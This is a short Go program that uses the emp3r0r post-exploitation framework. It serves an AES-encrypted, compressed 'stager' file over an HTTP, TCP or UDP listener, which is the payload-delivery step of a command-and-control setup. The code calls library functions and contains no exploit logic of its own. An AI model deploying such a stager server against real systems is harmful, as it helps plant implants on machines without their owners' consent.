package main

import (
	"flag"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"

	"github.com/jm33-m0/emp3r0r/core/lib/listener"
)

func main() {
	stagerPath := flag.String("stager", "", "path to the stager file to serve")
	port := flag.String("port", "8080", "port to serve the stager file on")
	keyStr := flag.String("key", "my_secret_key", "key to encrypt the stager file")
	listenerType := flag.String("type", "http", "listener type: http, tcp, or udp")
	flag.Parse()

	if *stagerPath == "" {
		logging.Fatal("stager file path is required")
	}

	switch *listenerType {
	case "http":
		listener.HTTPAESCompressedListener(*stagerPath, *port, *keyStr, true)
	case "tcp":
		listener.TCPAESCompressedListener(*stagerPath, *port, *keyStr, true)
	case "udp":
		listener.UDPAESCompressedListener(*stagerPath, *port, *keyStr, true)
	default:
		logging.Fatalf("Unknown listener type: %s (supported: http, tcp, udp)", *listenerType)
	}
}
